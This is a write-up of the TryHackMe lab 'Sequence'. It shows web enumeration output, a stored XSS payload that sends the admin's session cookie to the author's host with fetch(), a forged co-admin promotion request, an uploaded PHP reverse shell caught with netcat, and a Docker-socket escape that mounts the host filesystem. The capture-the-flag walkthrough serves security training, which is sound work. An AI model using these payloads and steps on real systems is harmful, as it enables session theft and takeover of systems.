<h1 align="center">Sequence</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/247f3dc8-e987-4479-bfb4-5cbdd1c86c15"><br>
2025, September 26<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>508</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Chain multiple vulnerabilities to take control of a system</em>.<br>
Access it <a href="https://tryhackme.com/room/sequence">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/c9523b72-23e0-4058-be8d-336d04e57155"></p>


<h1 align="center">Task 1 . Challenge</h1>
<p>Robert made some last-minute updates to the <code>review.thm</code> website before heading off on vacation. He claims that the secret information of the financiers is fully protected. But are his defenses truly airtight? Your challenge is to exploit the vulnerabilities and gain complete control of the system.<br>

Start the VM by clicking the <code>Start Machine</code> button at the top right of the task. You can complete the challenge by connecting through VPN or the AttackBox containing all the essential tools.</p>

<p><em>Answer the questions below</em></p>


<h2 align="center">Port Scanning</h2>

```bash
:~/Sequence# nmap -sC -sV -Pn -p- xx.xxx.xx.xxx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Review Shop
```

<h2 align="center">Vulnerability Scanning</h2>

```bash
:~/Sequence# nikto -h http://review.thm
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xxx
+ Target Hostname:    review.thm
+ Target Port:        80
+ Start Time:         2025-09-26 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ Cookie phpMyAdmin created without the httponly flag
+ Cookie goto created without the httponly flag
+ Cookie back created without the httponly flag
+ Cookie pma_lang created without the httponly flag
+ Uncommon header 'referrer-policy' found, with contents: no-referrer
+ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
+ Uncommon header 'x-frame-options' found, with contents: DENY
+ Uncommon header 'x-content-security-policy' found, with contents: default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-webkit-csp' found, with contents: default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ Uncommon header 'content-security-policy' found, with contents: default-src 'self' ;script-src 'self' 'unsafe-inline' 'unsafe-eval' ;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;object-src 'none';
+ Uncommon header 'x-xss-protection' found, with contents: 1; mode=block
+ OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ /login.php: Admin login page/section found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 6544 items checked: 0 error(s) and 22 item(s) reported on remote host
+ End Time:           2025-09-26 xx:xx:xx (GMT1) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

<h2 align="center">Host Resolution</h2>

```bash
xx.xxx.xx.xx review.thm
```

<h2 align="center">Directory and File Enumeration</h2>


```bash
:~/Sequence# gobuster dir -u http://review.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -k -e -t 60
...
http://review.thm/index.php            (Status: 200) [Size: 1694]
http://review.thm/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
...
http://review.thm/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
...
http://review.thm/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
http://review.thm/server-status        (Status: 403) [Size: 275]
http://review.thm/uploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
```

```bash
:~/Sequence# gobuster dir -u http://review.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x php,html -k -e -t 60
...
http://review.thm/chat.php             (Status: 302) [Size: 0] [--> login.php]
http://review.thm/contact.php          (Status: 200) [Size: 2246]
http://review.thm/dashboard.php        (Status: 302) [Size: 1400] [--> login.php]
http://review.thm/db.php               (Status: 200) [Size: 0]
http://review.thm/header.php           (Status: 200) [Size: 1400]
http://review.thm/index.php            (Status: 200) [Size: 1694]
http://review.thm/index.php            (Status: 200) [Size: 1694]
http://review.thm/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
http://review.thm/logout.php           (Status: 302) [Size: 0] [--> index.php]
http://review.thm/login.php            (Status: 200) [Size: 1944]
http://review.thm/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
http://review.thm/new.html             (Status: 200) [Size: 562]
http://review.thm/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
http://review.thm/server-status        (Status: 403) [Size: 275]
http://review.thm/settings.php         (Status: 302) [Size: 0] [--> login.php]
http://review.thm/uploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
```

```bash
:~/Sequence# gobuster dir -u http://review.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -e -t 60
...
http://review.thm/uploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]
http://review.thm/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
http://review.thm/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
http://review.thm/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
http://review.thm/server-status        (Status: 403) [Size: 275]
Progress: 220560 / 220561 (100.00%)
```

```bash
:~/Sequence# ffuf -u 'http://review.thm/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -mc all -t 100 -fc 403,404 -e .php -ic
...
contact.php             [Status: 200, Size: 2246, Words: 388, Lines: 87]
                        [Status: 200, Size: 1694, Words: 234, Lines: 69]
index.php               [Status: 200, Size: 1694, Words: 234, Lines: 69]
login.php               [Status: 200, Size: 1944, Words: 329, Lines: 79]
mail                    [Status: 301, Size: 315, Words: 20, Lines: 10]
header.php              [Status: 200, Size: 1400, Words: 204, Lines: 60]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
chat.php                [Status: 302, Size: 0, Words: 1, Lines: 1]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1]
settings.php            [Status: 302, Size: 0, Words: 1, Lines: 1]
dashboard.php           [Status: 302, Size: 1400, Words: 204, Lines: 60]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10]
                        [Status: 200, Size: 1694, Words: 234, Lines: 69]
```

<p>🤗 🎉</p>

```bash
:~/Sequence# dirsearch -u http://review.thm/ -r -x 401,402,403,404

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Sequence/reports/http_review.thm/__xx-xx-26_xx-xx-xx.txt

Target: http://review.thm/

[xx:xx:xx] Starting: 
[xx:xx:xx] 302 -    0B  - /chat.php  ->  login.php
[xx:xx:xx] 200 -  764B  - /contact.php
[xx:xx:xx] 302 -    1KB - /dashboard.php  ->  login.php
[xx:xx:xx] 200 -    0B  - /db.php
[xx:xx:xx] 200 -  576B  - /header.php
[xx:xx:xx] 301 -  313B  - /javascript  ->  http://review.thm/javascript/
Added to the queue: javascript/
[xx:xx:xx] 200 -  747B  - /login.php
[xx:xx:xx] 302 -    0B  - /logout.php  ->  index.php
[xx:xx:xx] 200 -  450B  - /mail/
Added to the queue: mail/
[xx:xx:xx] 301 -  307B  - /mail  ->  http://review.thm/mail/
[xx:xx:xx] 200 -  357B  - /new.html
[xx:xx:xx] 301 -  313B  - /phpmyadmin  ->  http://review.thm/phpmyadmin/
Added to the queue: phpmyadmin/
[xx:xx:xx] 200 -    3KB - /phpmyadmin/doc/html/index.html
[xx:xx:xx] 200 -    3KB - /phpmyadmin/
[xx:xx:xx] 200 -    3KB - /phpmyadmin/index.php
[xx:xx:xx] 302 -    0B  - /settings.php  ->  login.php
[xx:xx:xx] 301 -  310B  - /uploads  ->  http://review.thm/uploads/
Added to the queue: uploads/
[xx:xx:xx] 200 -  403B  - /uploads/

[xx:xx:xx] Starting: javascript/

[xx:xx:xx] Starting: mail/
[xx:xx:xx] 200 -  442B  - /mail/dump.txt

[xx:xx:xx] Starting: phpmyadmin/
[xx:xx:xx] 301 -  316B  - /phpmyadmin/js  ->  http://review.thm/phpmyadmin/js/
Added to the queue: phpmyadmin/js/
[xx:xx:xx] 301 -  317B  - /phpmyadmin/doc  ->  http://review.thm/phpmyadmin/doc/
Added to the queue: phpmyadmin/doc/
[xx:xx:xx] 200 -   22KB - /phpmyadmin/favicon.ico
[xx:xx:xx] 200 -    7KB - /phpmyadmin/js/config.js
[xx:xx:xx] 301 -  317B  - /phpmyadmin/sql  ->  http://review.thm/phpmyadmin/sql/
Added to the queue: phpmyadmin/sql/
[xx:xx:xx] 301 -  320B  - /phpmyadmin/themes  ->  http://review.thm/phpmyadmin/themes/
Added to the queue: phpmyadmin/themes/

[xx:xx:xx] Starting: uploads/

[xx:xx:xx] Starting: phpmyadmin/js/
[xx:xx:xx] 200 -    5KB - /phpmyadmin/js/common.js
[xx:xx:xx] 200 -    6KB - /phpmyadmin/js/export.js
[xx:xx:xx] 200 -    9KB - /phpmyadmin/js/sql.js

[xx:xx:xx] Starting: phpmyadmin/doc/
xx:xx:xx] 301 -  322B  - /phpmyadmin/doc/html  ->  http://review.thm/phpmyadmin/doc/html/
Added to the queue: phpmyadmin/doc/html/

[xx:xx:xx] Starting: phpmyadmin/sql/

[xx:xx:xx] Starting: phpmyadmin/themes/

[xx:xx:xx] Starting: phpmyadmin/doc/html/
[xx:xx:xx] 200 -   44KB - /phpmyadmin/doc/html/config.html
[xx:xx:xx] 200 -   48KB - /phpmyadmin/doc/html/faq.html
[xx:xx:xx] 200 -    1KB - /phpmyadmin/doc/html/search.html
[xx:xx:xx] 200 -    2KB - /phpmyadmin/doc/html/settings.html
[xx:xx:xx] 200 -    2KB - /phpmyadmin/doc/html/user.html

Task Completed
```

<h2 align="center">review.thm</h2>

<img width="1125" height="346" alt="image" src="https://github.com/user-attachments/assets/63bd0e1d-e97b-419b-a19b-0503fce19673" />

<br>
<br>

<h2 align="center">review.thm/login.php</h2>

<img width="1128" height="407" alt="image" src="https://github.com/user-attachments/assets/35b96393-88ff-4afb-8fd1-ff1cd44fe9d8" />

<br>
<br>
<h2 align="center">review.thm/contact.php</h2>

<img width="1131" height="497" alt="image" src="https://github.com/user-attachments/assets/3bc9a528-955e-407c-b4a0-8088223ced95" />

<br>
<br>
<h2 align="center">review.thm/new.html</h2>

<img width="1127" height="190" alt="image" src="https://github.com/user-attachments/assets/038282a4-c0a4-4d18-8eec-3f74a944aed6" />

<br>
<br>
<h2 align="center">review.thm/phpmyadmin/index.php</h2>

<img width="1129" height="487" alt="image" src="https://github.com/user-attachments/assets/ba1075b5-10b4-4fb0-8e8d-54b924fb9628" />

<br>
<br>
<h2 align="center">review.thm/phpmyadmin/doc/html/index.html</h2>
<p>

- phpMyAdmin 4.9.5</p>

<img width="1120" height="183" alt="image" src="https://github.com/user-attachments/assets/68d09a8a-a664-458c-9e44-29014d01bc1b" />

<br>
<br>
<h2 align="center">review.thm/mail/dump.txt</h2>
<p>

- software@review.thm<br>
- product@review.thm<br>
- Finance panel = /finance.php<br>
- Lottery panel = /lottery.php<br>
- completed 8-characer alphanumeric password = ‼️(--------)<br>
- Robert</p>

```bash
From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (--------), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert
```

<h2 align="center">review.thm/uploads/</h2>

<img width="1127" height="313" alt="image" src="https://github.com/user-attachments/assets/fe9482f5-a406-4c60-b9e7-fc9088c9af5e" />

<br>
<br>
<h2 align="center">review.thm/contact.php</h2>

<p align="center"><em>PoC.js</em></p>

```bash
fetch("http://xx.xxx.xx.xx:9001/?cookie"+document.cookie)
```

<p align="center">Message sent</p>

```bash
<script src="http://xx.xxx.xx.xx:9001/PoC.js"></script>
```

<p align="center">HTTP server set up</p>

```bash
:~/Sequence# python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

<br>
<br>

<img width="1101" height="240" alt="image" src="https://github.com/user-attachments/assets/87cff185-2d5e-4ebe-80d6-3f34ce9a24b2" />

<br>
<br>
<br>
<br>

<img width="1125" height="286" alt="image" src="https://github.com/user-attachments/assets/638089b8-6716-408d-96b7-c083e51935f7" />

<br>
<br>
<br>

```bash
/?cookiePHPSESSID=************************* HTTP/1.1" 200 -
```

<img width="1134" height="345" alt="image" src="https://github.com/user-attachments/assets/c8c49612-3a2d-4813-a0d9-5cc5ed0bac70" />

<br>
<br>
<br>

<img width="706" height="110" alt="image" src="https://github.com/user-attachments/assets/a2273b1d-fc1c-4ec7-a830-bf5c6228d55f" />

<br>
<br>
<br>

<p align="center">refresh</p>

<img width="1131" height="280" alt="image" src="https://github.com/user-attachments/assets/77985f95-eddd-4f9c-8e5d-c768577d6008" />

<br>
<br>
<br>
<h2 align="center">review.thm/dashboard.php</h2>

<img width="1003" height="473" alt="image" src="https://github.com/user-attachments/assets/faacd13b-6833-4453-be33-975bc46d080f" />

<br>
<br>
<br>
<h2 align="center">review.thm/chat.php</h2>

<img width="999" height="524" alt="image" src="https://github.com/user-attachments/assets/4a246526-70a4-419a-bf30-58360771dbdf" />

<br>
<br>
<br>
<h2 align="center">review.thm/contact.php</h2>

<img width="1005" height="424" alt="image" src="https://github.com/user-attachments/assets/432a5356-a9f4-4224-b430-04f4b63f2e4b" />


<br>
<br>
<br>
<h2 align="center">review.thm/admin_view.php</h2>

<img width="1002" height="339" alt="image" src="https://github.com/user-attachments/assets/ff82544c-db3d-48ea-a8f4-ad8e88185c5e" />

<br>
<br>
<br>
<h2 align="center">review.thm/settings.html</h2>

<img width="1004" height="502" alt="image" src="https://github.com/user-attachments/assets/49c73d7d-24ff-4567-a647-e3e478a21140" />


<br>
<br>
<br>

<p  align="center"><em>Request</em></p>

```bash
GET /settings.php HTTP/1.1
Host: review.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://review.thm/settings.php
Cookie: PHPSESSID=*************************
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

<p  align="center"><em>Response</em></p>

```bash
HTTP/1.1 200 OK
...
<!DOCTYPE html>
<html>
<head>
    <title>
    ...



    <!-- Change Password Form -->
    <div class="card mb-4">
        <div class="card-header">Change Password</div>
        <div class="card-body">
            <form id="passwordForm">
                <div class="mb-3">
                    <input type="password" class="form-control" name="new_password" placeholder="Enter new password" required>
                    <input type="hidden" name="csrf_token" value="⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪">
                </div>
                <button type="submit" class="btn btn-primary">Update Password</button>
            </form>
            <div id="passwordResult" class="mt-3"></div>
        </div>
    </div>


    <div class="card">
        <div class="card-header">Promote Co-Admin</div>
        <div class="card-body">
            <form id="coAdminForm">
                <div class="mb-3">
                    <input type="text" class="form-control" name="username" placeholder="Enter username to promote" required>
					<input type="hidden" name="csrf_token_promote" value="⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪">
                </div>
                <button type="submit" class="btn btn-warning">Promote to Admin</button>
            </form>
            <div id="coAdminResult" class="mt-3"></div>
        </div>
    </div>
</div>

<script>
// Handle Change Password (POST)
document.getElementById("passwordForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const form = e.target;
    const data = new FormData(form);

    fetch('update_password.php', {
        method: 'POST',
        body: data
    })
    .then(res => res.text())
    .then(html => {
        document.getElementById("passwordResult").innerHTML = html;
        form.reset();
    });
});

// Handle Promote Co-Admin (GET)
document.getElementById("coAdminForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const form = e.target;
    const params = new URLSearchParams(new FormData(form)).toString();

    fetch('promote_coadmin.php?' + params, {
        method: 'GET'
    })
    .then(res => res.text())
    .then(html => {
        document.getElementById("coAdminResult").innerHTML = html;
        form.reset();
    });
});
</script>

</body>
</html>
```

<br>
<br>

```bash
md5("mod") --> ⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪⚪
```

```bash
:~/Sequence# echo -n "admin" | md5sum
🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣🟣  -
```

<p align="center">Message sent<br>http://xx/xxx/xx/xx:9001/PoC.js</p>

<br>
<br>

<p align="center">Message sent<br>http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=...</p>

<img width="997" height="268" alt="image" src="https://github.com/user-attachments/assets/44bde513-5b0e-4def-9763-1bb5d8192137" />



<br>
<br>
<h2 align="center">mod was promoted</h2>

<img width="1003" height="474" alt="image" src="https://github.com/user-attachments/assets/28df1287-4491-4530-a570-53b257e27d68" />


<br>
<br>
<p align="center">changed mod´s password<br>logged out<br>logged in</p>

<br>

<p>1.1. What is the flag value after logging in as mod?<br>
<code>THM{**************}</code></p>

<br>

<img width="1000" height="350" alt="image" src="https://github.com/user-attachments/assets/1dfa09c8-ce61-46d4-9530-f30f4c2682ac" />


<br>
<br>
<br>

<p  align="center"><em>Request</em></p>

```bash
GET /chat.php HTTP/1.1
Host: review.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://review.thm/dashboard.php
Cookie: PHPSESSID=*************************
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

<p  align="center"><em>Response</em></p>

```bash
HTTP/1.1 200 OK
...


<!DOCTYPE html>
...
                     <li class="nav-item">
              <a class="nav-link" href="admin_view.php">View Feedback</a>
            </li>
          
          <li class="nav-item">
            <a class="nav-link" href="settings.php">Settings</a>
          </li>

        		<li class="nav-item">
            <a class="nav-link" href="contact.php">Contact Us</a>
          </li>
		  
		   		   		<li class="nav-item">
            <a class="nav-link" href="contact.php">THM{**************}</a>
          </li>
```

<br>
<p>1.2. What is the flag value after loggng in as <strong>admin</strong>?<br>
<code>THM{**************}</code></p>

<br>
<br>

<p align="center">Message sent<br>http://review.thm/admin_view.php</p>

<img width="1007" height="234" alt="image" src="https://github.com/user-attachments/assets/b97b7f3a-34ea-48d3-b665-74606430f23c" />

<br>
<br>
<h2 align="center">Admin !!!</h2>

<img width="1002" height="344" alt="image" src="https://github.com/user-attachments/assets/f736f023-b4af-486a-b23b-e035a3584eb4" />

<br>
<br>

<p align="center">Selected Lottery feature</p>

<img width="1003" height="376" alt="image" src="https://github.com/user-attachments/assets/00caeb1b-6825-4123-8c09-ca8d6bfef68e" />


<br>
<br>

<img width="1001" height="479" alt="image" src="https://github.com/user-attachments/assets/9a837167-d46b-4d50-aef3-709ea56bd48f" />


<br>
<br>

<p align="center">Alice Ventures $100,000 20% alice@finance.thm<br>Bov Capital $250,000 35% bob@finance.thm<br>Charlie Group  $80,0000 15% charlie@finance.thm<br>Delta Fund $300,000 40% delta@finance.thm<br>Echo Investments $150m000 25% echo@finance.thm</p>

<h2 align="center">Uploaded Latest Investor Details</h2>

```bash
script>
(function(_0x26f759,_0x4823cb){const _0x3dc5ed=_0x5bed,_0x1e8516=_0x26f759();while(!![]){try{const _0x397444=parseInt(_0x3dc5ed(0x184))/0x1*(parseInt(_0x3dc5ed(0x183))/0x2)+-.............................................on _0x5bed(_0x594ded,_0x5b9fe9){const _0x4d8194=_0x4d81();return _0x5bed=function(_0x5bedc8,_0x2cc3e3){_0x5bedc8=_0x5bedc8-0x170;let _0x5b9445=_0x4d8194[_0x5bedc8];return _0x5b9445;},_0x5bed(_0x594ded,_0x5b9fe9);}function _0x4d81(){const _0x1abde2=['981ArhkJP','?\x20Invalid\x20password.','2142980VRjkxA','finance-accessPassword','finance-overlay','1501254JtUgqD','3056iEqyUb','148UEhFUg','value','1848QXKTjE','textContent','5LBoKSf','style','getElementById','8701370jScmLA','finance-error-msg','2034216WWJJWS','1023296FrbGiS','block','display','S60u}f5j'];_0x4d81=function(){return _0x1abde2;};return _0x4d81();}
```

<h2 align="center">We need a passworddddddddddddddddddddddddddddd</h2>
<p align="center">Remembered of (--------)<br>The above script returns also (--------)</p>

<img width="1608" height="779" alt="image" src="https://github.com/user-attachments/assets/5bc735f9-ba00-4f95-9f5a-bb65b642428d" />

<br>
<br>
<p align="center">Used Code Beautify JAVA Viewer --> https://codebeautify.org/javaviewer</p>

<img width="1476" height="589" alt="image" src="https://github.com/user-attachments/assets/c08182f8-b9ac-431c-8708-e841cd55886e" />

<br>
<br>
<p align="center">Entered Finance Panel password</p>

<img width="1608" height="642" alt="image" src="https://github.com/user-attachments/assets/c92ad941-e3f1-4222-8876-384df6c616b0" />

<br>
<br>
<p align="center">Accessed Investor Finance Table</p>

<img width="1000" height="470" alt="image" src="https://github.com/user-attachments/assets/f53dcdc5-fa76-409a-be69-951584a92c62" />


<br>
<br>
<p align="center">Customized PentestMonkey Reverse Shell<br>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</p>

<img width="1250" height="674" alt="image" src="https://github.com/user-attachments/assets/c8187ab1-e8da-4e1b-8f62-d877a66b3568" />

<br>
<br>
<p align="center">Set up a listener</p>

```bash
:~/Sequence# nc -nlvp 1234
Listening on 0.0.0.0 1234
```

<br>
<br>
<p align="center">Browse > Select > Open > Upload</p>

<img width="1701" height="325" alt="image" src="https://github.com/user-attachments/assets/6ee38640-4bf1-41aa-9647-0a8998954747" />

<br>
<br>

<img width="1520" height="462" alt="image" src="https://github.com/user-attachments/assets/33bef7ac-0fc2-4c75-bf47-69ec274a88a1" />

<br>
<br>
<br>
<br>
<br>
<h2 align="center">💥 uploads/r.php 💥</h2>

<p align="center"><em>Request</em></p>

```bash
POST /dashboard.php HTTP/1.1
Host: review.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------294878893521255911952443389194
Content-Length: 189
Origin: http://review.thm
Connection: close
Referer: http://review.thm/dashboard.php
Cookie: PHPSESSID=*************************
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------294878893521255911952443389194
Content-Disposition: form-data; name="feature"

uploads/r.php
-----------------------------294878893521255911952443389194--

```

<p align="center"><em>Response</em></p>

```bash
:~/Sequence# nc -nlvp 1234
...
# whoami
root
# which python3
/usr/bin/python3
# python3 -c 'import pty;pty.spawn("/bin/bash")'
:/# ^Z
[1]+  Stopped                 nc -nlvp 1234
:~/Sequence# stty raw -echo; fg
nc -nlvp 1234

root@4f18a45cca05:/# export TERM=xterm
...
root@4f18a45cca05:/# ls -lah
total 60K
drwxr-xr-x   1 root root 4.0K Jun  4 15:46 .
drwxr-xr-x   1 root root 4.0K Jun  4 15:46 ..
-rwxr-xr-x   1 root root    0 Jun  4 15:46 .dockerenv
lrwxrwxrwx   1 root root    7 May 20 00:00 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K May  9 14:50 boot
drwxr-xr-x   5 root root  340 Sep 26 xx:xx dev
drwxr-xr-x   1 root root 4.0K Jun  4 15:46 etc
drwxr-xr-x   2 root root 4.0K May  9 14:50 home
lrwxrwxrwx   1 root root    7 May 20 00:00 lib -> usr/lib
lrwxrwxrwx   1 root root    9 May 20 00:00 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4.0K May 20 00:00 media
drwxr-xr-x   2 root root 4.0K May 20 00:00 mnt
drwxr-xr-x   2 root root 4.0K May 20 00:00 opt
dr-xr-xr-x 198 root root    0 Sep 26 17:28 proc
drwx------   1 root root 4.0K Jun  4 15:44 root
drwxr-xr-x   1 root root 4.0K Jun  4 15:46 run
lrwxrwxrwx   1 root root    8 May 20 00:00 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K May 20 00:00 srv
dr-xr-xr-x  13 root root    0 Sep 26 xx:xx sys
drwxrwxrwt   1 root root 4.0K Sep 26 xx:xx tmp
drwxr-xr-x   1 root root 4.0K May 20 00:00 usr
drwxr-xr-x   1 root root 4.0K May 21 23:17 var
```

```bash
:~# ls -la /var/run/docker.sock
srw-rw---- 1 root 121 0 Sep 26 xx:xx /var/run/docker.sock
```

```bash
:/# docker -H unix:///var/run/docker.sock images ls
REPOSITORY   TAG       IMAGE ID   CREATED   SIZE
```

```bash
root@4f18a45cca05:/# docker -H unix:///var/run/docker.sock images
REPOSITORY      TAG       IMAGE ID       CREATED        SIZE
phpvulnerable   latest    d0bf58293d3b   3 months ago   926MB
php             8.1-cli   0ead645a9bc2   6 months ago   527MB
```

<br>

```bash
# cd /root45cca05:/# docker run -it --rm -v /:/host phpvulnerable:latest /bin/sh 
# ls
# pwd
/root
# ls -lah
total 20K
drwx------ 1 root root 4.0K Jun  4 15:44 .
drwxr-xr-x 1 root root 4.0K Sep 26 xx:xx ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4.0K Jun  4 15:44 .ssh
# cd ..
# ls -lah
total 60K
drwxr-xr-x   1 root root 4.0K Sep 26 xx:xx .
drwxr-xr-x   1 root root 4.0K Sep 26 xx:xx ..
-rwxr-xr-x   1 root root    0 Sep 26 xx:xx .dockerenv
lrwxrwxrwx   1 root root    7 May 20 00:00 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K May  9 14:50 boot
drwxr-xr-x   5 root root  360 Sep 26 xx:xx dev
drwxr-xr-x   1 root root 4.0K Sep 26 xx:xx etc
drwxr-xr-x   2 root root 4.0K May  9 14:50 home
drwxr-xr-x  19 root root 4.0K Sep 26 xx:xx host
lrwxrwxrwx   1 root root    7 May 20 00:00 lib -> usr/lib
lrwxrwxrwx   1 root root    9 May 20 00:00 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4.0K May 20 00:00 media
drwxr-xr-x   2 root root 4.0K May 20 00:00 mnt
drwxr-xr-x   2 root root 4.0K May 20 00:00 opt
dr-xr-xr-x 202 root root    0 Sep 26 xx:xx proc
drwx------   1 root root 4.0K Jun  4 15:44 root
drwxr-xr-x   1 root root 4.0K Jun  4 15:44 run
lrwxrwxrwx   1 root root    8 May 20 00:00 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K May 20 00:00 srv
dr-xr-xr-x  13 root root    0 Sep 26 xx:xx sys
drwxrwxrwt   1 root root 4.0K Jun  4 15:44 tmp
drwxr-xr-x   1 root root 4.0K May 20 00:00 usr
drwxr-xr-x   1 root root 4.0K May 21 23:17 var
# cd host
# ls -lah
total 76K
drwxr-xr-x  19 root root 4.0K Sep 26 xx:xx .
drwxr-xr-x   1 root root 4.0K Sep 26 xx:xx ..
-rw-r--r--   1 root root  166 Sep 26 xx:xx .badr-info
lrwxrwxrwx   1 root root    7 Oct 26  2020 bin -> usr/bin
drwxr-xr-x   3 root root 4.0K Jul  9 18:57 boot
drwxr-xr-x  17 root root 3.8K Sep 26 xx:xx dev
drwxr-xr-x 113 root root 4.0K Sep 26 xx:xx etc
drwxr-xr-x   4 root root 4.0K Jun  4 11:48 home
lrwxrwxrwx   1 root root    7 Oct 26  2020 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Oct 26  2020 lib32 -> usr/lib32
